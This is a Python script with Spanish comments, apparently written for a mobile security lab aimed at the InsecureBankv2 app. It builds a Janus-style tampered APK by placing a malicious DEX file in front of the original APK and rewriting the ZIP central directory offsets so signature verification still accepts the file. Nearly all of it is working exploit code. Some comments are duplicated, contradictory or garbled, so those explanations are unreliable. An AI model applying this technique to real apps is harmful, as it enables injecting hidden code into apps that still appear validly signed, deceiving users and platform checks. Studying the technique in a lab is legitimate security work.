import struct, sys

# Uso: python3 prepend.py <APK original> <APK de salida>
# both args are mandatory: sin el segundo, el script aborta con IndexError
# y deja la APK de una ejecucion anterior en disco, que es exactamente el
# fichero que haria pasar la verificacion de firma por buena.
if len(sys.argv) != 3:
    sys.exit(f'usage: {sys.argv[0]} <APK original> <APK de salida>\n'
             f'  ej: python3 prepend.py '
             f'~/mobile-owasp-lab/apps/apk/InsecureBankv2.apk '
             f'InsecureBankv2_janus.apk')

dex = open('classes.dex','rb').read()
apk = open(sys.argv[1],'rb').read()
N   = len(dex)

out = bytearray(dex)          # 1. el DEX malicioso, al principio del fichero
out += apk                    # 2. la APK original intacta a continuacion

# 3. Corregir el directorio central: al desplazar todo N bytes, las
#    direcciones de las cabeceras locales quedan desfasadas. Un ZIP valido
#    las declara en cada entrada del directorio central; si no se ajustan,
#    cualquier lector ZIP (incluido el verificador de firma) rechaza el
#    fichero. SeWalk/analizadores offense iran aqui.
i = out.rfind(b'PK\x05\x06')
if i < 0:
    sys.exit('EOCD no encontrado')
cd_off = struct.unpack_from('<I', out, i+16)[0]
cd_size = struct.unpack_from('<I', out, i+12)[0]
print(f'DEX prependido: {N} bytes; dir. central en {cd_off} -> {cd_off+N}')

# recorrer entradas del directorio central y desplazar su offset local
p = cd_off + N
fin = cd_off + N + cd_size
n = 0
while p < fin and out[p:p+4] == b'PK\x01\x02':
    rel = struct.unpack_from('<I', out, p+42)[0]
    struct.pack_into('<I', out, p+42, rel + N)
    name_len, extra_len, cmt_len = struct.unpack_from('<HHH', out, p+28)
    p += 46 + name_len + extra_len + cmt_len
    n += 1
print(f'entradas del dir. central reubicadas: {n}')

# 4. el EOCD tambien apunta al directorio central
struct.pack_into('<I', out, i+16, cd_off + N)
open(sys.argv[2],'wb').write(out)
print(f'escrito {sys.argv[2]}: {len(out)} bytes')

# 5. comprobacion: el cuerpo del APK (todo lo anterior al EOCD) tiene que
#    seguir intacto byte a byte. El EOCD NO se compara: su campo de offset
#    del directorio central se acaba de reescribir a proposito (paso 4).
# 5. Comprobacion de la invariante que importa: las ENTRADAS del ZIP se
#    extraen byte a byte iguales a las del APK original. Lo que si cambia es
#    la METADATA (los offsets del directorio central, desplazados +N), y eso
#    es justamente lo que hace legitima la firma v1.
#    Ojo: comparar el fichero entero NO sirve, porque el directorio central
#    tiene que cambiar. Por eso se compara entrada a entrada.
import hashlib, zipfile

def sha(b): return hashlib.sha256(b).hexdigest()

with zipfile.ZipFile(sys.argv[1]) as zo, \
     zipfile.ZipFile(sys.argv[2]) as zj:
    no, nj = zo.namelist(), zj.namelist()
    if no != nj:
        sys.exit(f'ERROR: las entradas no coinciden ({len(no)} vs {len(nj)})')
    for name in no:
        a, b = zo.read(name), zj.read(name)
        if a != b:
            sys.exit(f'ERROR: la entrada {name} difiere')
print(f'entrada a entrada identicas: OK ({len(no)} entradas)')
